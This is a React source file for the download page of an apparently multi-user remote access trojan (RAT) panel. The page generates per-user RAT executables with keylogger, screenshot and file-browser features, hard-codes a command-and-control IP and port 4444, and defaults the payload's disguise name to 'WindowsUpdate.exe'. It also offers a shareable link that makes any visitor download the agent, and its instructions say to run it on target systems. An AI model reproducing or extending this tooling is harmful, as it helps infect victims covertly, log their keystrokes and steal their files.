import { useState, useEffect } from 'react';
import { Download, Keyboard, User, Code, Server, Cpu, Shield, Link, Copy, Check } from 'lucide-react';
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider';

interface UserData {
  id: string;
  username: string;
  role: 'admin' | 'user';
}

interface RatConfig {
  server_ip: string;
  server_port: number;
  user_id: string;
  beacon_interval: number;
  enable_screenshots: boolean;
  enable_keylogger: boolean;
  enable_file_browser: boolean;
}

function RatDownloadPage() {
  const [user, setUser] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);
  const [config, setConfig] = useState<RatConfig>({
    server_ip: '207.189.10.136',
    server_port: 4444,
    user_id: '',
    beacon_interval: 30000,
    enable_screenshots: true,
    enable_keylogger: true,
    enable_file_browser: true
  });
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [customFilename, setCustomFilename] = useState<string>('');
  const [personalUrl, setPersonalUrl] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [deployFilename, setDeployFilename] = useState<string>('WindowsUpdate.exe');
  const [filenameInput, setFilenameInput] = useState<string>('');
  const [filenameSaved, setFilenameSaved] = useState(false);

  const { subscribe, send } = useBridgeWebSocket();

  useEffect(() => {
    return subscribe('connected', (msg: any) => {
      if (msg.downloadUrl) setPersonalUrl(msg.downloadUrl);
      if (msg.c2Host) setConfig(prev => ({ ...prev, server_ip: msg.c2Host }));
      if (msg.c2Port) setConfig(prev => ({ ...prev, server_port: msg.c2Port }));
      if (msg.downloadFilename) { setDeployFilename(msg.downloadFilename); setFilenameInput(msg.downloadFilename); }
    });
  }, [subscribe]);

  useEffect(() => {
    return subscribe('download_filename_updated', (msg: any) => {
      if (msg.filename) { setDeployFilename(msg.filename); setFilenameSaved(true); setTimeout(() => setFilenameSaved(false), 2000); }
    });
  }, [subscribe]);

  useEffect(() => {
    // Get current user from localStorage
    const storedUser = localStorage.getItem('user');
    if (storedUser) {
      const userData = JSON.parse(storedUser);
      setUser(userData);
      setConfig(prev => ({
        ...prev,
        user_id: userData.id
      }));
    }
    setLoading(false);
  }, []);

  const generateRatFile = async () => {
    try {
      setGenerating(true);
      setError(null);

      if (!config.server_ip.trim()) {
        throw new Error('Server IP address is required. Enter your VPS public IP.');
      }

      const response = await fetch('/api/auth/generate-rat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({
          target_user_id: config.user_id,
          server_ip: config.server_ip,
          server_port: config.server_port
        })
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to generate RAT file');
      }

      const result = await response.json();
      
      // Now download the stub installer (Setup.exe) instead of the full RAT
      const downloadResponse = await fetch('/api/rat/download-stub', {
        credentials: 'include',
      });

      if (!downloadResponse.ok) {
        throw new Error('Failed to download RAT installer');
      }

      const blob = await downloadResponse.blob();
      const url = window.URL.createObjectURL(blob);
      setDownloadUrl(url);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to generate RAT file');
      console.error('Error generating RAT:', err);
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = () => {
    if (!downloadUrl) return;

    // Use custom filename if provided, otherwise use default
    const filename = customFilename.trim() || `rat_client_user${config.user_id}.exe`;
    
    const link = document.createElement('a');
    link.href = downloadUrl;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    // Clean up URL
    setTimeout(() => {
      window.URL.revokeObjectURL(downloadUrl);
      setDownloadUrl(null);
      setCustomFilename(''); // Reset custom filename after download
    }, 100);
  };

  // @ts-ignore
  const getDefaultConfig = () => {
    if (!user) return config;
    
    return {
      ...config,
      user_id: user.id
    };
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-slate-400">Loading...</div>
      </div>
    );
  }

  if (!user) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <Shield className="w-12 h-12 text-slate-700 mx-auto mb-4" />
          <p className="text-slate-500">Please log in to access RAT download</p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-white">RAT Client Download</h1>
          <p className="text-slate-400 mt-1">
            Generate and download a custom RAT client configured for your account</p>
        </div>
        <User className="w-8 h-8 text-slate-600" />
      </div>

      {/* Quick Deploy Link */}
      <div className="bg-slate-900 rounded-xl border border-blue-800/50 p-5">
        <div className="flex items-center gap-2 mb-3">
          <Link className="w-4 h-4 text-blue-400" />
          <h2 className="text-base font-semibold text-white">Your Personal Deploy Link</h2>
        </div>
        {personalUrl ? (
          <div className="space-y-3">
            <p className="text-xs text-slate-400">Share this URL — anyone who visits it downloads the pre-compiled agent. Clients will appear in your account.</p>
            <div className="flex items-center gap-2">
              <code className="flex-1 bg-slate-800 text-green-400 text-xs px-3 py-2 rounded-lg truncate select-all">{personalUrl}</code>
              <button
                onClick={() => { navigator.clipboard.writeText(personalUrl); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
                className="flex items-center gap-1.5 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs rounded-lg transition-colors shrink-0"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                {copied ? 'Copied!' : 'Copy'}
              </button>
              <a
                href={personalUrl}
                download={deployFilename}
                className="flex items-center gap-1.5 px-3 py-2 bg-blue-700 hover:bg-blue-600 text-white text-xs rounded-lg transition-colors shrink-0"
              >
                <Download className="w-3.5 h-3.5" />
                Download
              </a>
            </div>
            {/* Custom filename */}
            <div className="flex items-center gap-2 pt-1">
              <span className="text-xs text-slate-400 shrink-0">Download as:</span>
              <input
                type="text"
                value={filenameInput}
                onChange={e => setFilenameInput(e.target.value)}
                placeholder="WindowsUpdate.exe"
                className="flex-1 bg-slate-800 border border-slate-700 text-slate-200 text-xs px-3 py-1.5 rounded-lg focus:border-blue-500 focus:outline-none"
              />
              <button
                onClick={() => send({ type: 'set_download_filename', filename: filenameInput })}
                className="flex items-center gap-1 px-3 py-1.5 bg-slate-700 hover:bg-slate-600 text-xs text-slate-300 rounded-lg transition-colors shrink-0"
              >
                {filenameSaved ? <Check className="w-3 h-3 text-green-400" /> : null}
                {filenameSaved ? 'Saved!' : 'Save'}
              </button>
            </div>
          </div>
        ) : (
          <p className="text-xs text-slate-500 italic">Connecting to bridge...</p>
        )}
      </div>

      {/* Configuration Panel */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Configuration Form */}
        <div className="bg-slate-900 rounded-xl border border-slate-800 p-6">
          <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <Code className="w-5 h-5" />
            Configuration
          </h2>

          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1">
                Server IP Address
              </label>
              <input
                type="text"
                value={config.server_ip}
                onChange={(e) => setConfig({...config, server_ip: e.target.value})}
                className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="e.g., 1.2.3.4 (your VPS public IP)"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1">
                Server Port
              </label>
              <input
                type="number"
                value={config.server_port}
                onChange={(e) => setConfig({...config, server_port: parseInt(e.target.value)})}
                className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                min="1"
                max="65535"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1">
                User ID (Automatically set to your account)
              </label>
              <input
                type="number"
                value={config.user_id}
                disabled
                className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-400"
              />
              <p className="text-xs text-slate-500 mt-1">
                This RAT will be associated with your account (User ID: {config.user_id})
              </p>
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1">
                Beacon Interval (ms)
              </label>
              <input
                type="number"
                value={config.beacon_interval}
                onChange={(e) => setConfig({...config, beacon_interval: parseInt(e.target.value)})}
                className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                min="1000"
                step="1000"
              />
              <p className="text-xs text-slate-500 mt-1">
                How often the RAT sends heartbeat to server (default: 30 seconds)
              </p>
            </div>

            <div className="space-y-3 pt-2">
              <h3 className="text-sm font-medium text-slate-300">Features</h3>
              
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-slate-400" />
                  <span className="text-slate-300">Screenshot Capture</span>
                </div>
                <label className="relative inline-flex items-center cursor-pointer">
                  <input
                    type="checkbox"
                    checked={config.enable_screenshots}
                    onChange={(e) => setConfig({...config, enable_screenshots: e.target.checked})}
                    className="sr-only peer"
                  />
                  <div className="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                </label>
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Keyboard className="w-4 h-4 text-slate-400" />
                  <span className="text-slate-300">Keylogger</span>
                </div>
                <label className="relative inline-flex items-center cursor-pointer">
                  <input
                    type="checkbox"
                    checked={config.enable_keylogger}
                    onChange={(e) => setConfig({...config, enable_keylogger: e.target.checked})}
                    className="sr-only peer"
                  />
                  <div className="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                </label>
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Server className="w-4 h-4 text-slate-400" />
                  <span className="text-slate-300">File Browser</span>
                </div>
                <label className="relative inline-flex items-center cursor-pointer">
                  <input
                    type="checkbox"
                    checked={config.enable_file_browser}
                    onChange={(e) => setConfig({...config, enable_file_browser: e.target.checked})}
                    className="sr-only peer"
                  />
                  <div className="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                </label>
              </div>
            </div>

            <div className="pt-4">
              <button
                onClick={generateRatFile}
                disabled={generating}
                className="w-full px-4 py-3 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                {generating ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Generating RAT...
                  </>
                ) : (
                  <>
                    <Code className="w-5 h-5" />
                    Generate RAT Client
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Download Panel */}
        <div className="bg-slate-900 rounded-xl border border-slate-800 p-6">
          <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <Download className="w-5 h-5" />
            Download
          </h2>

          {error && (
            <div className="mb-4 bg-red-900/30 border border-red-700 text-red-300 px-4 py-3 rounded-lg">
              {error}
            </div>
          )}

          <div className="space-y-4">
            <div className="bg-slate-800/50 rounded-lg p-4">
              <h3 className="font-medium text-white mb-2">Generated RAT Details</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-slate-400">Filename:</span>
                  <span className="text-slate-300">rat_client_user{config.user_id}.exe</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Target User:</span>
                  <span className="text-slate-300">{user.username} (ID: {config.user_id})</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Server:</span>
                  <span className="text-slate-300">{config.server_ip}:{config.server_port}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Beacon Interval:</span>
                  <span className="text-slate-300">{config.beacon_interval}ms</span>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-4">
              <h3 className="font-medium text-white mb-2">Custom Filename</h3>
              <div className="space-y-2">
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Custom filename (optional)
                  </label>
                  <input
                    type="text"
                    value={customFilename}
                    onChange={(e) => setCustomFilename(e.target.value)}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder={`rat_client_user${config.user_id}.exe`}
                  />
                  <p className="text-xs text-slate-500 mt-1">
                    Leave empty to use default name. Include .exe extension for Windows.
                  </p>
                </div>
                <div className="text-sm text-slate-400">
                  <div className="flex justify-between">
                    <span>Default filename:</span>
                    <span>rat_client_user{config.user_id}.exe</span>
                  </div>
                  <div className="flex justify-between mt-1">
                    <span>Will download as:</span>
                    <span className="text-slate-300">
                      {customFilename.trim() || `rat_client_user${config.user_id}.exe`}
                    </span>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-4">
              <h3 className="font-medium text-white mb-2">Features Included</h3>
              <ul className="space-y-2 text-sm">
                <li className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${config.enable_screenshots ? 'bg-green-500' : 'bg-red-500'}`}></div>
                  <span className={config.enable_screenshots ? 'text-slate-300' : 'text-slate-500'}>
                    Screenshot Capture
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${config.enable_keylogger ? 'bg-green-500' : 'bg-red-500'}`}></div>
                  <span className={config.enable_keylogger ? 'text-slate-300' : 'text-slate-500'}>
                    Keylogger
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${config.enable_file_browser ? 'bg-green-500' : 'bg-red-500'}`}></div>
                  <span className={config.enable_file_browser ? 'text-slate-300' : 'text-slate-500'}>
                    File Browser
                  </span>
                </li>
              </ul>
            </div>

            <div className="pt-4">
              <button
                onClick={handleDownload}
                disabled={!downloadUrl || generating}
                className="w-full px-4 py-3 bg-green-600 hover:bg-green-700 disabled:bg-slate-800 disabled:text-slate-500 disabled:cursor-not-allowed text-white rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <Download className="w-5 h-5" />
                {downloadUrl ? 'Download RAT Client' : 'Generate RAT first'}
              </button>
              
              {downloadUrl && (
                <p className="text-xs text-slate-500 mt-2 text-center">
                  Click to download your custom RAT client executable
                </p>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Instructions */}
      <div className="bg-slate-900 rounded-xl border border-slate-800 p-6">
        <h2 className="text-xl font-bold text-white mb-4">Usage Instructions</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-slate-800/50 rounded-lg p-4">
            <div className="text-blue-400 font-bold text-lg mb-2">1. Generate</div>
            <p className="text-slate-400 text-sm">
              Configure your RAT settings and click "Generate RAT Client". The server will compile a custom executable with your user ID embedded.
            </p>
          </div>
          <div className="bg-slate-800/50 rounded-lg p-4">
            <div className="text-blue-400 font-bold text-lg mb-2">2. Download</div>
            <p className="text-slate-400 text-sm">
              Once generated, download the executable. The file will be named with your user ID to ensure it connects to your account.
            </p>
          </div>
          <div className="bg-slate-800/50 rounded-lg p-4">
            <div className="text-blue-400 font-bold text-lg mb-2">3. Deploy</div>
            <p className="text-slate-400 text-sm">
              Run the executable on target systems. It will automatically connect to your C2 server and appear in your client list.
            </p>
          </div>
        </div>

        <div className="mt-6 p-4 bg-blue-900/20 border border-blue-800 rounded-lg">
          <h3 className="font-medium text-blue-300 mb-2">Important Security Notes</h3>
          <ul className="text-sm text-blue-400 space-y-1">
            <li>• Each RAT is uniquely tied to your user account</li>
            <li>• Other users cannot see or control your RAT clients</li>
            <li>• Admin users can see all clients across all users</li>
            <li>• Keep your RAT executables secure - they contain your user credentials</li>
            <li>• Regenerate new RATs if you suspect compromise</li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default RatDownloadPage;